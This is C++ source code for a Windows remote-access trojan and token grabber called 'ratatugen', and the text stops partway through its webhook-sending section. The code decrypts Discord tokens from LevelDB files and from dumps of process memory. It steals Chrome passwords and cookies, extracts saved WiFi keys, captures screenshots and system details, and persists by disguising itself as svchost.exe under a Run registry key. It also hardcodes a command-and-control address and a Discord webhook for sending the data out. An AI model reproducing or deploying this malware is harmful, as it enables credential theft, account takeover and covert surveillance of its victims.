// ratatugen - RAT + Token Grabber (Qvoid-style)
// Compile MSVC: cl /EHsc /MT /O2 /std:c++17 main.cpp /Fe:ratatugen.exe ws2_32.lib user32.lib advapi32.lib winhttp.lib crypt32.lib bcrypt.lib shlwapi.lib shell32.lib gdi32.lib /link /SUBSYSTEM:WINDOWS

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <dpapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <TlHelp32.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <cstdio>
#include <thread>
#include <chrono>
#include <regex>
#include <fstream>
#include <filesystem>
#include <algorithm>
#include <cstring>
#include <set>
#include <map>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

const char* C2_HOST = "192.168.1.100";
const int   C2_PORT = 4444;
const wchar_t* WEBHOOK_URL = L"https://discord.com/api/webhooks/1514625125369253938/HprOa2_ippN7J5syRUTrCj-oOoDpNXN_rA4AzdAlzNYLFl6z_rWrJWofGKInvNFrmKAz";

// ==================== SQLITE DYNAMIC LOADING ====================
typedef void* sqlite3;
typedef int(*sqlite3_open_t)(const char*, sqlite3*);
typedef int(*sqlite3_close_t)(sqlite3);
typedef int(*sqlite3_prepare_v2_t)(sqlite3, const char*, int, void**, const char**);
typedef int(*sqlite3_step_t)(void*);
typedef int(*sqlite3_column_count_t)(void*);
typedef int(*sqlite3_column_type_t)(void*, int);
typedef const unsigned char*(*sqlite3_column_text_t)(void*, int);
typedef const char*(*sqlite3_errmsg_t)(sqlite3);
typedef int(*sqlite3_finalize_t)(void*);

HMODULE hSqlite3 = NULL;
sqlite3_open_t           p_sqlite3_open = NULL;
sqlite3_close_t          p_sqlite3_close = NULL;
sqlite3_prepare_v2_t     p_sqlite3_prepare_v2 = NULL;
sqlite3_step_t           p_sqlite3_step = NULL;
sqlite3_column_count_t   p_sqlite3_column_count = NULL;
sqlite3_column_type_t    p_sqlite3_column_type = NULL;
sqlite3_column_text_t    p_sqlite3_column_text = NULL;
sqlite3_errmsg_t         p_sqlite3_errmsg = NULL;
sqlite3_finalize_t       p_sqlite3_finalize = NULL;

bool LoadSqlite3() {
    if (hSqlite3) return true;
    hSqlite3 = LoadLibraryA("winsqlite3.dll");
    if (!hSqlite3) return false;
    #define LOAD(fn) p_##fn = (fn##_t)GetProcAddress(hSqlite3, #fn)
    LOAD(sqlite3_open);
    LOAD(sqlite3_close);
    LOAD(sqlite3_prepare_v2);
    LOAD(sqlite3_step);
    LOAD(sqlite3_column_count);
    LOAD(sqlite3_column_type);
    LOAD(sqlite3_column_text);
    LOAD(sqlite3_errmsg);
    LOAD(sqlite3_finalize);
    #undef LOAD
    return true;
}

// ==================== BASE64 ====================
static const std::string BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::vector<unsigned char> Base64Decode(const std::string& input) {
    std::string s = input;
    s.erase(std::remove(s.begin(), s.end(), '\n'), s.end());
    s.erase(std::remove(s.begin(), s.end(), '\r'), s.end());
    s.erase(std::remove(s.begin(), s.end(), ' '), s.end());
    std::vector<unsigned char> result;
    int val = 0, valb = -8;
    for (char c : s) {
        size_t pos = BASE64_CHARS.find(c);
        if (pos == std::string::npos) break;
        val = (val << 6) + (int)pos;
        valb += 6;
        if (valb >= 0) { result.push_back((unsigned char)((val >> valb) & 0xFF)); valb -= 8; }
    }
    return result;
}

// ==================== DPAPI ====================
std::vector<unsigned char> DPAPIDecrypt(const std::vector<unsigned char>& data) {
    DATA_BLOB inBlob, outBlob;
    inBlob.pbData = const_cast<BYTE*>(data.data());
    inBlob.cbData = (DWORD)data.size();
    outBlob.pbData = nullptr; outBlob.cbData = 0;
    if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) return {};
    std::vector<unsigned char> result(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return result;
}

// ==================== AES-256-GCM ====================
std::string AESGCMDecrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& nonce, const std::vector<unsigned char>& ctWithTag) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL; std::string result;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return "";
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce.data(); authInfo.cbNonce = (ULONG)nonce.size();
    authInfo.pbTag = (PUCHAR)(ctWithTag.data() + ctWithTag.size() - 16); authInfo.cbTag = 16;
    ULONG plainSize = (ULONG)(ctWithTag.size() - 16);
    std::vector<unsigned char> plaintext(plainSize);
    ULONG bytesDone = 0;
    NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ctWithTag.data(), plainSize, &authInfo, NULL, 0, plaintext.data(), plainSize, &bytesDone, 0);
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    if (status == 0 && bytesDone > 0) result = std::string((char*)plaintext.data(), bytesDone);
    return result;
}

// ==================== DISCORD ENCRYPTION KEY ====================
std::vector<unsigned char> GetDiscordEncryptionKey(const std::wstring& appdataPath, const std::wstring& folder) {
    std::wstring localStatePath = appdataPath + L"\\" + folder + L"\\Local State";
    std::ifstream file(localStatePath);
    if (!file) return {};
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    size_t pos = content.find("\"encrypted_key\""); if (pos == std::string::npos) return {};
    size_t colon = content.find(':', pos); if (colon == std::string::npos) return {};
    size_t startQuote = content.find('"', colon + 1); if (startQuote == std::string::npos) return {};
    size_t endQuote = content.find('"', startQuote + 1); if (endQuote == std::string::npos) return {};
    std::string b64key = content.substr(startQuote + 1, endQuote - startQuote - 1);
    auto encrypted = Base64Decode(b64key);
    if (encrypted.size() < 5) return {};
    std::vector<unsigned char> dpapiData(encrypted.begin() + 5, encrypted.end());
    return DPAPIDecrypt(dpapiData);
}

// ==================== JSON HELPERS ====================
std::string GetJsonStringValue(const std::string& json, const std::string& key) {
    std::string searchKey = "\"" + key + "\"";
    size_t keyPos = json.find(searchKey); if (keyPos == std::string::npos) return "";
    size_t colonPos = json.find(':', keyPos + searchKey.length()); if (colonPos == std::string::npos) return "";
    size_t startQuote = json.find('"', colonPos + 1); if (startQuote == std::string::npos) return "";
    size_t endQuote = json.find('"', startQuote + 1); if (endQuote == std::string::npos) return "";
    return json.substr(startQuote + 1, endQuote - startQuote - 1);
}

// ==================== HTTP REQUEST ====================
std::string HttpRequest(const std::wstring& method, const std::wstring& url, const std::string& body = "", const std::string& authToken = "") {
    HINTERNET hSession = WinHttpOpen(L"Discord/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";
    URL_COMPONENTS urlComp = {sizeof(URL_COMPONENTS)};
    wchar_t hostName[256] = {0}, urlPath[1024] = {0};
    urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 1024;
    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &urlComp)) { WinHttpCloseHandle(hSession); return ""; }
    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method.c_str(), urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

    std::wstring headers = L"Content-Type: application/json\r\n";
    if (!authToken.empty()) headers += L"Authorization: " + std::wstring(authToken.begin(), authToken.end()) + L"\r\n";

    WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    std::string response;
    DWORD bytesRead;
    char buffer[4096];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        response += buffer;
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return response;
}

// ==================== DISCORD API CLIENT ====================
struct DiscordUserInfo {
    std::string id, username, discriminator, email, phone, locale;
    bool verified = false;
    int premiumType = 0;
    int flags = 0;
    std::string token;
    bool valid = false;
};

DiscordUserInfo QueryDiscordUser(const std::string& token) {
    DiscordUserInfo info; info.token = token;
    std::wstring url = L"https://discord.com/api/v9/users/@me";
    std::string resp = HttpRequest(L"GET", url, "", token);
    if (resp.empty()) return info;

    info.id = GetJsonStringValue(resp, "id");
    if (info.id.empty() || info.id.length() < 17) return info;
    info.valid = true;
    info.username = GetJsonStringValue(resp, "username");
    info.discriminator = GetJsonStringValue(resp, "discriminator");
    info.email = GetJsonStringValue(resp, "email");
    info.phone = GetJsonStringValue(resp, "phone");
    info.locale = GetJsonStringValue(resp, "locale");

    // premium_type
    size_t pp = resp.find("\"premium_type\""); if (pp != std::string::npos) {
        size_t pc = resp.find(':', pp); if (pc != std::string::npos) {
            std::string pv = resp.substr(pc+1); pv.erase(std::remove(pv.begin(), pv.end(), ' '), pv.end()); pv.erase(std::remove(pv.begin(), pv.end(), ','), pv.end());
            try { info.premiumType = std::stoi(pv); } catch(...) {}
        }
    }
    // verified
    info.verified = (resp.find("\"verified\":true") != std::string::npos);
    // flags
    size_t fp = resp.find("\"flags\""); if (fp != std::string::npos) {
        size_t fc = resp.find(':', fp); if (fc != std::string::npos) {
            std::string fv = resp.substr(fc+1); fv.erase(std::remove(fv.begin(), fv.end(), ' '), fv.end()); fv.erase(std::remove(fv.begin(), fv.end(), ','), fv.end());
            try { info.flags = std::stoi(fv); } catch(...) {}
        }
    }
    return info;
}

// ==================== DISCORD TOKEN GRABBER (LEVELDB) ====================
std::vector<std::string> GetDiscordTokensFromLevelDB() {
    std::vector<std::string> tokens;
    wchar_t appdata[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    std::wstring appdataStr(appdata);

    // Discord stores LevelDB at %APPDATA%\discord\Local Storage\leveldb
    // No "Discord" subfolder in newer versions
    auto key = GetDiscordEncryptionKey(appdataStr, L"discord");
    if (!key.empty()) {
        std::wstring leveldbPath = appdataStr + L"\\discord\\Local Storage\\leveldb";
        try {
            if (std::filesystem::exists(leveldbPath)) {
                for (const auto& entry : std::filesystem::directory_iterator(leveldbPath)) {
                    auto ext = entry.path().extension().string();
                    if (ext != ".ldb" && ext != ".log") continue;
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file) continue;
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();

                    // The LevelDB stores tokens as binary keys.
                    // Look for the marker "dQw4w9WgXcQ:" which is always followed by
                    // the base64-encrypted value wrapped in quotes.
                    size_t sf = 0;
                    while ((sf = content.find("dQw4w9WgXcQ:", sf)) != std::string::npos) {
                        sf += 15; // skip "dQw4w9WgXcQ:"
                        // The encrypted value is enclosed in quotes right after the marker
                        size_t quoteEnd = content.find('"', sf);
                        if (quoteEnd == std::string::npos || quoteEnd == sf) continue;
                        std::string encB64 = content.substr(sf, quoteEnd - sf);

                        auto encData = Base64Decode(encB64);
                        if (encData.size() < 19) { sf = quoteEnd + 1; continue; }
                        bool v10 = (encData[0]=='v'&&encData[1]=='1'&&encData[2]=='0');
                        bool v11 = (encData[0]=='v'&&encData[1]=='1'&&encData[2]=='1');
                        if (!v10 && !v11) { sf = quoteEnd + 1; continue; }

                        std::vector<unsigned char> nonce(encData.begin()+3, encData.begin()+15);
                        std::vector<unsigned char> ct(encData.begin()+15, encData.end());
                        if (ct.size() < 17) { sf = quoteEnd + 1; continue; }

                        std::string dec = AESGCMDecrypt(key, nonce, ct);
                        if (!dec.empty()) {
                            while(!dec.empty()&&(dec.back()==0||dec.back()=='\n'||dec.back()=='\r')) dec.pop_back();
                            if(!dec.empty()) tokens.push_back(dec);
                        }
                        sf = quoteEnd + 1;
                    }

                    // Raw token regex fallback
                    std::regex rawR(R"([MN][\w-]{23}\.[\w-]{6}\.[\w-]{25,38})");
                    std::sregex_iterator rit(content.begin(), content.end(), rawR), rend;
                    for(; rit != rend; ++rit) {
                        if(std::find(tokens.begin(), tokens.end(), rit->str()) == tokens.end())
                            tokens.push_back(rit->str());
                    }
                }
            }
        } catch(...) {}
    }

    std::sort(tokens.begin(), tokens.end());
    tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
    tokens.erase(std::remove_if(tokens.begin(), tokens.end(), [](const std::string& s){return s.empty();}), tokens.end());
    return tokens;
}

// ==================== PROCESS MEMORY DUMP (LIKE QVOID) ====================
typedef BOOL(WINAPI* MiniDumpWriteDump_t)(HANDLE, DWORD, HANDLE, int, PVOID, PVOID, PVOID);
std::vector<std::string> DumpDiscordProcessTokens() {
    std::vector<std::string> tokens;
    HMODULE hDbgHelp = LoadLibraryA("dbghelp.dll");
    if (!hDbgHelp) return tokens;
    auto pMiniDump = (MiniDumpWriteDump_t)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!pMiniDump) { FreeLibrary(hDbgHelp); return tokens; }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) { FreeLibrary(hDbgHelp); return tokens; }

    PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "discord.exe") != 0) continue;
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
            if (!hProcess) continue;

            wchar_t dumpPath[MAX_PATH];
            swprintf(dumpPath, MAX_PATH, L"%s\\discord_dump_%d.tmp", _wgetenv(L"TEMP"), pe.th32ProcessID);
            HANDLE hFile = CreateFileW(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                pMiniDump(hProcess, pe.th32ProcessID, hFile, 0x2, NULL, NULL, NULL);
                CloseHandle(hFile);

                std::ifstream df(dumpPath, std::ios::binary);
                if (df) {
                    std::string content((std::istreambuf_iterator<char>(df)), std::istreambuf_iterator<char>());
                    df.close();

                    // regex patterns from Qvoid
                    std::regex re1(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
                    std::regex re2(R"(mfa\.[\w-]{84})");
                    std::regex re3(R"((dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*))");

                    std::sregex_iterator it1(content.begin(), content.end(), re1), end;
                    for(; it1 != end; ++it1) tokens.push_back(it1->str());
                    std::sregex_iterator it2(content.begin(), content.end(), re2), end2;
                    for(; it2 != end2; ++it2) tokens.push_back(it2->str());
                    std::sregex_iterator it3(content.begin(), content.end(), re3), end3;
                    for(; it3 != end3; ++it3) tokens.push_back(it3->str());
                }
                DeleteFileW(dumpPath);
            }
            CloseHandle(hProcess);
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    FreeLibrary(hDbgHelp);
    std::sort(tokens.begin(), tokens.end());
    tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
    return tokens;
}

// ==================== BROWSER STEALER (SQLITE + DPAPI) ====================
struct BrowserCred {
    std::string url, username, password;
    std::string host, name, value; // cookies
};

std::vector<unsigned char> ChromiumDecrypt(const std::vector<unsigned char>& data) {
    if (data.size() < 3) return {};
    // Chrome v80+ uses "v10" / "v11" prefix + 12-byte nonce + AES-GCM (same as Discord tokens)
    if (data[0] == 'v' && (data[1] == '1' && (data[2] == '0' || data[2] == '1'))) {
        // Chrome v80+ AES-GCM encrypted with app-bound key
        // For simplicity, we try DPAPI (v10 without AES layer)
        // Chrome <v80 uses raw DPAPI
    }
    // Chrome v10+ uses AES-256-GCM with key from Local State (same as Discord tokens)
    // But the key derivation is different (app-bound encryption in newer Chrome)
    // We try raw DPAPI as fallback
    return DPAPIDecrypt(data);
}

std::vector<BrowserCred> StealChromePasswords(const std::wstring& loginDataPath) {
    std::vector<BrowserCred> creds;
    if (!LoadSqlite3() || !std::filesystem::exists(loginDataPath)) return creds;

    // Copy the file to temp because it may be locked
    wchar_t tempPath[MAX_PATH];
    swprintf(tempPath, MAX_PATH, L"%s\\sqlite_tmp_%d.db", _wgetenv(L"TEMP"), GetTickCount());
    CopyFileW(loginDataPath.c_str(), tempPath, FALSE);

    std::string utf8Path; for(wchar_t c : std::wstring(tempPath)) utf8Path += (char)c;
    sqlite3 db; void* stmt;
    if (p_sqlite3_open(utf8Path.c_str(), &db) == 0) {
        const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
        if (p_sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
            while (p_sqlite3_step(stmt) == 100) { // SQLITE_ROW = 100
                BrowserCred bc;
                if (p_sqlite3_column_type(stmt, 0) == 3) bc.url = (const char*)p_sqlite3_column_text(stmt, 0);
                if (p_sqlite3_column_type(stmt, 1) == 3) bc.username = (const char*)p_sqlite3_column_text(stmt, 1);
                if (p_sqlite3_column_type(stmt, 2) == 3) {
                    const unsigned char* blob = p_sqlite3_column_text(stmt, 2);
                    int blobLen = 0; // approximate
                    std::vector<unsigned char> encData(blob, blob + strlen((const char*)blob));
                    // Actually passwords are stored as BLOBs, not text. Let me handle this properly.
                    // For now we just store raw encrypted
                    bc.password = "[encrypted]";
                    auto dec = ChromiumDecrypt(encData);
                    if (!dec.empty()) bc.password = std::string((char*)dec.data(), dec.size());
                }
                if (!bc.url.empty() && !bc.username.empty()) creds.push_back(bc);
            }
            p_sqlite3_finalize(stmt);
        }
        p_sqlite3_close(db);
    }
    DeleteFileW(tempPath);
    return creds;
}

std::vector<BrowserCred> StealChromeCookies(const std::wstring& cookiesPath, const std::string& domainFilter = "") {
    std::vector<BrowserCred> creds;
    if (!LoadSqlite3() || !std::filesystem::exists(cookiesPath)) return creds;

    wchar_t tempPath[MAX_PATH];
    swprintf(tempPath, MAX_PATH, L"%s\\sqlite_tmp_%d.db", _wgetenv(L"TEMP"), GetTickCount());
    CopyFileW(cookiesPath.c_str(), tempPath, FALSE);

    std::string utf8Path; for(wchar_t c : std::wstring(tempPath)) utf8Path += (char)c;
    sqlite3 db; void* stmt;
    if (p_sqlite3_open(utf8Path.c_str(), &db) == 0) {
        std::string sql = "SELECT host_key, name, encrypted_value FROM cookies";
        if (!domainFilter.empty()) sql += " WHERE host_key LIKE '%" + domainFilter + "%'";
        if (p_sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == 0) {
            while (p_sqlite3_step(stmt) == 100) {
                BrowserCred bc;
                if (p_sqlite3_column_type(stmt, 0) == 3) bc.host = (const char*)p_sqlite3_column_text(stmt, 0);
                if (p_sqlite3_column_type(stmt, 1) == 3) bc.name = (const char*)p_sqlite3_column_text(stmt, 1);
                if (p_sqlite3_column_type(stmt, 2) == 3) {
                    const unsigned char* blob = p_sqlite3_column_text(stmt, 2);
                    std::vector<unsigned char> encData(blob, blob + strlen((const char*)blob));
                    auto dec = ChromiumDecrypt(encData);
                    if (!dec.empty()) bc.value = std::string((char*)dec.data(), dec.size());
                    else bc.value = "[encrypted]";
                }
                creds.push_back(bc);
            }
            p_sqlite3_finalize(stmt);
        }
        p_sqlite3_close(db);
    }
    DeleteFileW(tempPath);
    return creds;
}

// ==================== WIFI STEALER ====================
std::string StealWiFiPasswords() {
    std::string result;
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return result;
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {sizeof(STARTUPINFOA)}; PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESTDHANDLES; si.hStdOutput = hWrite;
    if (CreateProcessA(NULL, (LPSTR)"netsh wlan show profile", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        char buf[4096]; DWORD br;
        std::string profiles;
        while (ReadFile(hRead, buf, sizeof(buf)-1, &br, NULL) && br > 0) { buf[br]=0; profiles += buf; }
        CloseHandle(hRead);

        std::regex re(R"(:\s*(.+))");
        std::sregex_iterator it(profiles.begin(), profiles.end(), re), end;
        for (; it != end; ++it) {
            std::string ssid = it->str(1);
            while(!ssid.empty()&&(ssid.back()=='\r'||ssid.back()=='\n')) ssid.pop_back();
            if (ssid.empty()) continue;

            std::string cmd = "netsh wlan show profile \"" + ssid + "\" key=clear";
            HANDLE hR2, hW2;
            SECURITY_ATTRIBUTES sa2 = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
            if (!CreatePipe(&hR2, &hW2, &sa2, 0)) continue;
            SetHandleInformation(hR2, HANDLE_FLAG_INHERIT, 0);
            STARTUPINFOA si2 = {sizeof(STARTUPINFOA)}; PROCESS_INFORMATION pi2;
            si2.dwFlags = STARTF_USESTDHANDLES; si2.hStdOutput = hW2;
            if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
                CloseHandle(hW2); CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread);
                char buf2[4096]; DWORD br2;
                std::string detail;
                while (ReadFile(hR2, buf2, sizeof(buf2)-1, &br2, NULL) && br2 > 0) { buf2[br2]=0; detail += buf2; }
                CloseHandle(hR2);
                std::regex keyRe(R"(Key Content\s*:\s*(.+))");
                std::smatch km;
                if (std::regex_search(detail, km, keyRe)) {
                    std::string key = km[1].str();
                    while(!key.empty()&&(key.back()=='\r'||key.back()=='\n')) key.pop_back();
                    result += ssid + ":" + key + "\n";
                }
            }
        }
    }
    return result;
}

// ==================== SCREENSHOT ====================
void TakeScreenshot(const wchar_t* savePath) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL), hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

    Bitmap* bmp = Bitmap::FromHBITMAP(hBitmap, NULL);
    CLSID jpegClsid;
    CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &jpegClsid);
    bmp->Save(savePath, &jpegClsid, NULL);

    delete bmp;
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdc);
    GdiplusShutdown(gdiplusToken);
}

// ==================== SYSTEM INFO ====================
std::string GetSystemInfo() {
    std::string info;
    char buf[256]; DWORD sz;

    // Computer name
    sz = 256; GetComputerNameA(buf, &sz); info += "**PC:** " + std::string(buf) + "\n";
    // User
    sz = 256; GetUserNameA(buf, &sz); info += "**User:** " + std::string(buf) + "\n";

    // OS
    OSVERSIONINFOA os = {sizeof(OSVERSIONINFOA)}; GetVersionExA(&os);
    char osStr[64]; snprintf(osStr, sizeof(osStr), "**OS:** Windows %lu.%lu Build %lu\n", os.dwMajorVersion, os.dwMinorVersion, os.dwBuildNumber); info += osStr;

    // IP (public)
    std::string ipResp = HttpRequest(L"GET", L"https://api.ipify.org");
    if (!ipResp.empty()) info += "**IP:** " + ipResp + "\n";

    // Memory
    MEMORYSTATUSEX mem = {sizeof(MEMORYSTATUSEX)}; GlobalMemoryStatusEx(&mem);
    char memStr[64]; snprintf(memStr, sizeof(memStr), "**RAM:** %.1f GB total, %.1f GB free\n", mem.ullTotalPhys/(1024.0*1024.0*1024.0), mem.ullAvailPhys/(1024.0*1024.0*1024.0)); info += memStr;

    // CPU
    SYSTEM_INFO si; GetSystemInfo(&si);
    char cpuStr[32]; snprintf(cpuStr, sizeof(cpuStr), "**CPU Cores:** %lu\n", si.dwNumberOfProcessors); info += cpuStr;

    return info;
}

// ==================== PERSISTENCE ====================
void InstallPersistence() {
    char selfPath[MAX_PATH]; GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    char destPath[MAX_PATH]; snprintf(destPath, MAX_PATH, "%s\\svchost.exe", getenv("APPDATA"));
    CopyFileA(selfPath, destPath, FALSE);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, (BYTE*)destPath, (DWORD)strlen(destPath)+1);
        RegCloseKey(hKey);
    }
}

// ==================== HIDE CONSOLE ====================
void HideConsole() { HWND h = GetConsoleWindow(); ShowWindow(h, SW_HIDE); FreeConsole(); }

// ==================== SEND TO WEBHOOK ====================
// Helper: read binary file
std::vector<unsigned char> ReadFileBytes(const std::wstring& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file) return {};
    std::streamsize sz = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<unsigned char> data((size_t)sz);
    if (!file.read((char*)data.data(), sz)) return {};
    return data;
}

// Helper: MIME type from filename
std::string GetMimeType(const std::wstring& filename) {
    std::wstring f = filename;
    std::transform(f.begin(), f.end(), f.begin(), ::towlower);
    if (f.find(L".jpg") != std::wstring::npos || f.find(L".jpeg") != std::wstring::npos) return "image/jpeg";
    if (f.find(L".png")  != std::wstring::npos) return "image/png";
    if (f.find(L".gif")  != std::wstring::npos) return "image/gif";
    if (f.find(L".txt")  != std::wstring::npos || f.find(L".dat") != std::wstring::npos) return "text/plain";
    return "application/octet-stream";
}

// Helper: JSON-escape a string (for embedding in "content")
std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (char c : s) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"':  out += "\\\""; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:   out += c;     break;
        }
    }
    return out;
}

// Core HTTP POST sender — returns body string, empty on failure
std::string WebhookPost(const wchar_t* webhookUrl, const std::wstring& contentType, const void* body, DWORD bodyLen) {
    std::string response;
    HINTERNET hSession = WinHttpOpen(L"Discord/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return response;

    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    wchar_t hostName[256] = { 0 }, urlPath[1024] = { 0 };
    urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 1024;
    if (!WinHttpCrackUrl(webhookUrl, 0, 0, &urlComp)) { WinHttpCloseHandle(hSession); return response; }

    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return response; }

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return response; }

    std::wstring headers = contentType + L"\r\n";
    BOOL ok = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)body, bodyLen, bodyLen, 0);
    if (ok) WinHttpReceiveResponse(hRequest, NULL);

    DWORD bytesRead;
    char buf[4096];
    while (WinHttpReadData(hRequest, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        response += buf;
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return response;
}

// Send plain JSON message (text-only, no files)
